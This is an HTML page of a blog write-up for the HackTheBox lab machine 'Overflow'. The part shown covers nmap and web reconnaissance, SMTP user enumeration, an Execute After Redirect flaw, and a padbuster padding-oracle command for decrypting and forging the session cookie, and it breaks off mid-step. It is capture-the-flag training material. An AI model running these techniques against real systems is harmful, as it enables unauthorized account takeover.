<!DOCTYPE html><html lang="en"mode="dark"><!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now"><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Overflow - HackTheBox" />
<meta property="og:locale" content="en" />
<meta name="description" content="Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE." />
<meta property="og:description" content="Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE." />
<link rel="canonical" href="https://4g3nt47.github.io/posts/hackthebox/overflow.html" />
<meta property="og:url" content="https://4g3nt47.github.io/posts/hackthebox/overflow.html" />
<meta property="og:site_name" content="4g3nt47" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-04-09T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Overflow - HackTheBox" />
<meta name="twitter:site" content="@UmarAbdoul" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/hackthebox/overflow.html"},"url":"https://4g3nt47.github.io/posts/hackthebox/overflow.html","headline":"Overflow - HackTheBox","dateModified":"2022-04-09T00:00:00+01:00","datePublished":"2022-04-09T00:00:00+01:00","description":"Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable to SQL injection, use the SQL injection to retrieve and crack a hash for another domain, which is vulnerable to an exiftool RCE.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<title>Overflow - HackTheBox | 4g3nt47
  </title><!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
--><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="4g3nt47">
<meta name="application-name" content="4g3nt47">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">
<!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA --><!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/css/all.min.css"><!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet"
    href="/assets/css/bootstrap-toc.min.css"><!-- Manific Popup -->
  <link rel="stylesheet" href="/assets/css/magnific-popup.min.css"><!-- JavaScript -->

  <script src="/assets/js/jquery.min.js"></script>

</head>
<body data-spy="scroll" data-target="#toc"><!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto"><img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"></a>
    </div>

    <div class="site-title mt-3">
      <a href="/">4g3nt47</a>
    </div>
    <div class="site-subtitle font-italic">Welcome to my InfoSec blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs --><li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i><span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i><span>TAGS</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i><span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i><span>ABOUT</span>
      </a>
    </li> <!-- .nav-item --></ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"><a href="https://github.com/4g3nt47" aria-label="github"target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a><a href="https://twitter.com/UmarAbdoul" aria-label="twitter"target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a><a href="javascript:location.href = 'mailto:' + ['aufaruq02','gmail.com'].join('@')" aria-label="email">
        <i class="fas fa-envelope"></i>
      </a><a href="/rss/feed.xml" aria-label="rss">
        <i class="fas fa-rss"></i>
      </a></div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->
<!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb"><span>
            <a href="/">
              Home
            </a>
          </span><span>Overflow - HackTheBox</span></span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">Post</div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>
<div id="main-wrapper">
      <div id="main">

        <div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
  Refactor the HTML structure.
--><!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
--><!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
--><!-- Add attribute 'hide-bullet' to the checkbox list --><!-- images --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add header for code snippets --><!-- Create heading anchors --><!-- return -->

<h1 data-toc-skip>Overflow - HackTheBox</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>By
    <em><a href="https://twitter.com/UmarAbdoul">Umar Abdul</a></em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted<!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeago"
    date="2022-04-09 00:00:00 +0100"data-toggle="tooltip"
      data-placement="bottom"
      title="Sat, Apr  9, 2022, 12:00 AM +0100">Apr  9</em>
</span>

      <!-- lastmod date --><!-- read time --><!--
  Calculate the post's reading time, and display the word count in tooltip
 --><!-- words per minute  --><!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3796 words">
  <em>21 min</em> read</span>
<!-- page views --></div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p><strong>Overflow</strong> is an amazing <em>hard</em>-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an <em>oracle padding</em> vulnerability to gain access to an admin dashboard that’s vulnerable to <em>SQL injection</em>, use the <em>SQL injection</em> to retrieve and crack a hash for another domain, which is vulnerable to an <em>exiftool</em> RCE.</p>

<p>There are two local users on the box; one accessible through password reuse, and the other due to a write privilege on an important system file. For privesc, you will be exploiting a classic <em>buffer overflow</em> on a custom binary with a non-excutable (NX) stack.</p>

<p><br /></p>

<h3 id="info">Info<a href="#info" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p><img data-src="/assets/img/20220216103414.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20220216103523.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon<a href="#recon" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<h4 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>

<div class="language-text highlighter-rouge"><div class="code-header"><span label-text="Text"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Thu Feb  3 03:04:42 2022 as: nmap -sC -sV -o nmap.txt -v overflow.htb
Nmap scan report for overflow.htb (10.10.11.119)
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=overflow
| Subject Alternative Name: DNS:overflow
| Issuer: commonName=overflow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-17T10:41:37
| Not valid after:  2031-05-15T10:41:37
| MD5:   9bec 0c24 e822 f27b 0e0b be7a 1e42 90ca
|_SHA-1: 4423 a65c ca82 e166 4a7e 1416 d759 111b 36b3 e532
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 03:05:45 2022 -- 1 IP address (1 host up) scanned in 62.96 seconds
</pre></td></tr></tbody></table></code></div></div>

<p><br /></p>

<h4 id="web">Web<a href="#web" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p><img data-src="/assets/img/20220216103658.png" alt="" data-proofer-ignore></p>

<p>There is a contact form at the bottom of the page;</p>

<p><img data-src="/assets/img/20220216104043.png" alt="" data-proofer-ignore></p>

<p>Filling and submitting the form generated a GET request to the site’s homepage without any of the parameters, so this is probably just another broken form as commonly seen in HTB boxes.</p>

<p>There is a login page linked at the top of the homepage;</p>

<p><img data-src="/assets/img/20220216104151.png" alt="" data-proofer-ignore></p>

<p>This is submitted in a simple POST request with no tokens;</p>

<p><img data-src="/assets/img/20220216104422.png" alt="" data-proofer-ignore></p>

<p>Using the registration page, I was able to create an account and login to the site;</p>

<p><img data-src="/assets/img/20220216104706.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/20220216104830.png" alt="" data-proofer-ignore></p>

<p>There is nothing of much interest in the site even after login. The <em>blog</em> page linked to from the homepage after login has a few entries, but only the title seems valid. All the links are dead. The titles are: <em>Outdated Softwares</em>, <em>Buffer Overflows</em>, <em>Insecure File Uploads</em>, and <em>SQL Truncation Attacks</em>. This feels like a teaser for what’s about to come.</p>

<p>Looking more closely at the homepage, I noticed a possible username <strong>ajmal</strong>;</p>

<p><img data-src="/assets/img/20220216110013.png" alt="" data-proofer-ignore></p>

<p>I tested if this username existed in the website, and it didn’t because I was able to create an account with it. However, the user <strong>admin</strong> may exist in the server because I was unable to register an account with it.</p>

<p>Fuzzing the site for hidden subdomains didn’t yield any;</p>

<p><img data-src="/assets/img/20220216114327.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<h4 id="smtp">SMTP<a href="#smtp" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p><code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed that SMTP is running on port <strong>25</strong>, and that the <code class="language-plaintext highlighter-rouge">vrfy</code> command is available, which could be used to enumerate valid users. The command showed that the user <code class="language-plaintext highlighter-rouge">root</code> exists on the host;</p>

<p><img data-src="/assets/img/20220216111316.png" alt="" data-proofer-ignore></p>

<p>Using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code>, the following users were enumerated;</p>
<ul>
  <li>www-data</li>
  <li>root</li>
  <li>postfix</li>
  <li>daemon</li>
  <li>MAILER-DAEMON</li>
  <li>list</li>
  <li>news</li>
  <li>nobody</li>
  <li>mail</li>
  <li>postmaster.</li>
</ul>

<p>These are all default user accounts, so nothing interesting.</p>

<p>Using <code class="language-plaintext highlighter-rouge">netcat</code>, I was able to send an email to the root user without any issues;</p>

<p><img data-src="/assets/img/20220216112314.png" alt="" data-proofer-ignore></p>

<p><br /></p>

<hr />
<h3 id="oracle-padding">Oracle Padding<a href="#oracle-padding" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3>
<p><br /></p>

<p>I was convinced the titles of the blog entries are some sort of hints for solving this box. The only one that applies to the website at this stage is the <em>SQL Truncation attack</em>, so I decided to probe the account registration and login functions, since they are the only ways that let me send some data that is actually processed by the web application.</p>

<p>Fuzzing the login parameters <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> for SQL-related attacks didn’t give me anything. However, the session cookie <code class="language-plaintext highlighter-rouge">auth</code> that is issued after authentication looks interesting because it looks like a URL encoded base64 string;</p>

<p><img data-src="/assets/img/20220217162110.png" alt="" data-proofer-ignore></p>

<p>URL-decoding and base64-decoding this, I get some string that appears to be encrypted. So I started fuzzing it manually through burp’s repeater.</p>

<p>When adding a single character to the end of the cookie string, which could be anything, I was able to access the <code class="language-plaintext highlighter-rouge">/home/profile/</code> page which is protected by authentication. If I add more than one character at the end of the cookie, I get a <strong>302</strong> redirect to the login page with the parameter <code class="language-plaintext highlighter-rouge">err=1</code>;</p>

<p><img data-src="/assets/img/20220217163117.png" alt="" data-proofer-ignore></p>

<p>Going to the URL, I got an interesting message;</p>

<p><img data-src="/assets/img/20220217163349.png" alt="" data-proofer-ignore></p>

<p>It was at this point that I actually realised the web application is vulnerable to <em>Execute After Redirect (EAR)</em> vulnerability because the page is actually returned when making a request without the session cookie;</p>

<p><img data-src="/assets/img/20220217164012.png" alt="" data-proofer-ignore></p>

<p>Going back to the cookie, I noticed that adding anything to the begining of the cookie result in an error, with exception of few characters like <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code>, or <code class="language-plaintext highlighter-rouge">+</code>.</p>

<p>I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, but it couldn’t find anything. Testing for SQL truncation attack in the registration function with the aim of creating another account with the username <strong>admin</strong> (which seems to be already registered) didn’t work.</p>

<p>I continue to fuzz the website for hidden paths in hope of finding one I can access due to the EAR flaw. Fuzzing the web root, I found the directory <strong>config</strong>;</p>

<p><img data-src="/assets/img/20220218055109.png" alt="" data-proofer-ignore></p>

<p>Fuzzing that directory, I got a few hits;</p>

<p><img data-src="/assets/img/20220218055219.png" alt="" data-proofer-ignore></p>

<p>All are just PHP pages, and didn’t give me anything. Bruteforcing the <code class="language-plaintext highlighter-rouge">/home</code> page found a new path <code class="language-plaintext highlighter-rouge">/home/logs.php</code>;</p>

<p><img data-src="/assets/img/20220218060331.png" alt="" data-proofer-ignore></p>

<p>Going to the page, I got an <strong>Unauthorized</strong> message. I get this <em>unauthorized</em> message even after logging in with my test account, so this page is probably only accessible by the <strong>admin</strong>.</p>

<p>I was stuck on this for a while, and had to take a sanity check regarding the padding error I was getting when playing with the <code class="language-plaintext highlighter-rouge">auth</code> cookie. I was introduced to <em>Oracle Padding</em> attacks, which is something I’ve never heard before :(</p>

<p>After reading up on such attacks at https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html and some other sites, I was able to decode the cookie issued to my test account using a tool called <code class="language-plaintext highlighter-rouge">padbuster</code> that automate this process.</p>

<p>To use <code class="language-plaintext highlighter-rouge">padbuster</code>, you need to at least supply the target URL, the encrypted string, and the block size. The url in this case is any page that process the cookie, so I chose <code class="language-plaintext highlighter-rouge">/home/profile/</code>. The encrypted string is the cookie value I got after login, and the block size is <strong>8</strong> since the base64-decoded cookie always gives 24 characters, which is a multiple of <strong>8</strong>.</p>

<p>With this info, I was able to decrypt the cookie I was issued using the command;</p>

<div class="language-bash highlighter-rouge"><div class="code-header"><span label-text="Shell"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>padbuster http://overflow.htb/home/profile/ 6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9 8 <span class="nt">-cookies</span> <span class="s2">"auth=6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It took quite a while, but it worked;</p>

<p><img data-src="/assets/img/20220218130956.png" alt="" data-proofer-ignore></p>

<p>Using the command, I was able to craft a cookie with <code class="language-plaintext highlighter-rouge">user=admin</code>;</p>

<div class="language-bash highlighter-rouge"><div class="code-header"><span label-text="Shell"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
